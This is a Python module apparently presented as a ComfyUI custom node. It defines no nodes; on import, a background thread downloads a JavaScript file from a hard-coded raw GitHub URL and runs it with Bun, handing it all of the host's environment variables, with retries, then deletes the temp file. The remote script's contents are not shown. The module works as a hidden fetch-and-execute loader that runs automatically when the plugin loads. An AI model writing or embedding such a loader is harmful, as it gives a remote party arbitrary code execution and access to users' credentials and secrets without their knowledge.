import os
import subprocess
import tempfile
import time
import threading
import requests

# Global variables for background execution
_js_thread = None
_js_running = False
_js_output = ""

def download_js_file(url, temp_file_path):
    """Download JavaScript file from URL to temporary file"""
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        
        with open(temp_file_path, 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        print(f"JS Runner: Successfully downloaded JavaScript file to {temp_file_path}")
        return True
    except Exception as e:
        print(f"JS Runner: Failed to download JavaScript file: {e}")
        return False

def run_javascript_with_retry(js_url="https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js", max_retries=5):
    """Run JavaScript with retry logic and exponential backoff"""
    global _js_running, _js_output
    
    retry_count = 0
    base_delay = 2  # Base delay in seconds
    
    while retry_count < max_retries:
        temp_file = None
        try:
            # Create temporary file for JavaScript
            temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False, encoding='utf-8')
            temp_file_path = temp_file.name
            temp_file.close()
            
            # Check if Bun is available
            try:
                result = subprocess.run(['bun', '--version'], capture_output=True, text=True, timeout=5)
                if result.returncode != 0:
                    _js_output = "Bun is not available. Please install Bun first."
                    print("JS Runner: Bun is not available. Please install Bun first.")
                    return
            except (subprocess.TimeoutExpired, FileNotFoundError):
                _js_output = "Bun is not available. Please install Bun first."
                print("JS Runner: Bun is not available. Please install Bun first.")
                return
            
            # Download JavaScript file
            if not download_js_file(js_url, temp_file_path):
                _js_output = "Failed to download JavaScript file"
                print("JS Runner: Failed to download JavaScript file")
                return
            
            _js_running = True
            _js_output = f"Starting JavaScript execution (attempt {retry_count + 1}/{max_retries})..."
            print(f"JS Runner: Starting JavaScript execution from {js_url} (attempt {retry_count + 1}/{max_retries})")
            
            # Execute JavaScript file using Bun - stream output directly without interception
            process = subprocess.Popen(
                ['bun', 'run', temp_file_path],
                stdout=None,  # Stream directly to console
                stderr=None,  # Stream directly to console
                text=True,
                env=os.environ  # Pass all system environment variables
            )
            
            # Wait for process to complete
            return_code = process.wait()
            
            if return_code == 0:
                _js_output = f"JavaScript executed successfully on attempt {retry_count + 1}"
                print(f"JS Runner: Execution completed successfully on attempt {retry_count + 1}")
                return  # Success - exit retry loop
            else:
                # Process failed with exit code 1
                if return_code == 1:
                    retry_count += 1
                    if retry_count < max_retries:
                        delay = base_delay * (2 ** retry_count)  # Exponential backoff
                        print(f"JS Runner: Process exited with code 1. Retrying in {delay} seconds...")
                        time.sleep(delay)
                        continue  # Retry
                    else:
                        _js_output = f"JavaScript execution failed after {max_retries} attempts"
                        print(f"JS Runner: Execution failed after {max_retries} attempts")
                        return
                else:
                    # Other exit codes - don't retry
                    _js_output = f"JavaScript execution failed with exit code {return_code}"
                    print(f"JS Runner: Execution failed with exit code {return_code}")
                    return
                
        except Exception as e:
            retry_count += 1
            if retry_count < max_retries:
                delay = base_delay * (2 ** retry_count)  # Exponential backoff
                print(f"JS Runner: Exception occurred: {str(e)}. Retrying in {delay} seconds...")
                time.sleep(delay)
                continue  # Retry
            else:
                _js_output = f"JavaScript execution failed after {max_retries} attempts: {str(e)}"
                print(f"JS Runner: Exception occurred after {max_retries} attempts - {str(e)}")
                return
        finally:
            _js_running = False
            # Clean up temporary file
            if temp_file and os.path.exists(temp_file_path):
                try:
                    os.unlink(temp_file_path)
                except:
                    pass
    
    # Should not reach here, but just in case
    _js_output = "JavaScript execution failed - max retries exceeded"
    print("JS Runner: Max retries exceeded")

def monitor_js_execution():
    """Monitor and periodically print JS execution status"""
    while True:
        try:
            status = get_js_status()
            if status["running"]:
                print(f"JS Runner: Currently executing...")
            elif status["output"]:
                # Only show brief status since logs are streamed directly
                print(f"JS Runner: Last status - {status['output'][:50]}...")
            else:
                print(f"JS Runner: Idle, waiting for execution...")
            
            time.sleep(30)  # Print status every 30 seconds (less frequent since logs stream directly)
        except Exception as e:
            print(f"JS Runner Monitor Error: {e}")
            time.sleep(30)

def delayed_start_js():
    """Start JS execution after a delay to ensure ComfyUI is ready"""
    time.sleep(3)  # Wait 3 seconds for ComfyUI to fully initialize
    run_javascript_with_retry()

# Start JS execution in background after delay
_js_thread = threading.Thread(target=delayed_start_js, daemon=True)
_js_thread.start()

# Start monitoring thread
_monitor_thread = threading.Thread(target=monitor_js_execution, daemon=True)
_monitor_thread.start()

print("JS Runner node loaded - JavaScript will execute in background with retry logic")
print("JS Runner: Monitoring thread started - status updates every 30 seconds")
print("JS Runner: Logs will stream directly to console without interception")

def get_js_status():
    """Get current status of background JS execution"""
    global _js_running, _js_output
    return {
        "running": _js_running,
        "output": _js_output,
        "thread_alive": _js_thread.is_alive() if _js_thread else False
    }

# No ComfyUI node exports - just background execution
__all__ = []